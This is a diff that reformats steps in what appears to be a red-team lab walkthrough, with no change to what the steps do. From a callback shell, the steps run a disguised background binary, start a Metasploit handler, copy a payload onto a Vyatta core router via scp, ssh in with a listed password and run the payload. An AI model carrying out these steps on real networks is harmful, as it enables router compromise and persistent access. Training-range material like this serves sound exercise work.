@@ -543,9 +543,10 @@ In the terminal that has your beacon shell (palo alto callback)
  chmod +x pan-netflow
  mv pan-netflow /usr/local/bin/pan-netflow
  ```
-3. cd to where the file is  
+ cd to where the file is  
 `cd /usr/local/bin`
-4. run the file and send it to the background so you can continue to use your shell  
+
+ Run the file and send it to the background so you can continue to use your shell  
 `./pan-netflow &` 
 
 
@@ -577,12 +578,20 @@ exploit -j
 ```
 3. On our palo alto callback shell 
  scp the payload file from the server and place it in the /usr/local/bin folder on the vyatta router
- `scp <payload-file> vyatta@<vyatta-router-IP>:/usr/local/bin/`
+```
+ scp <payload-file> vyatta@<vyatta-router-IP>:/usr/local/bin/
+```
  ssh onto the core router 
- `ssh vyatta@1.33.170.6`  -  password: simnet
+ ```
+ ssh vyatta@1.33.170.6
+ ```
+ password: simnet
+ 
  navigate to the directory we sent the file to
+ ```
  cd /usr/local/bin
  chmod +x <payload-file>
+ ```
 4. run the payload
    `./payload-file> &` 
 
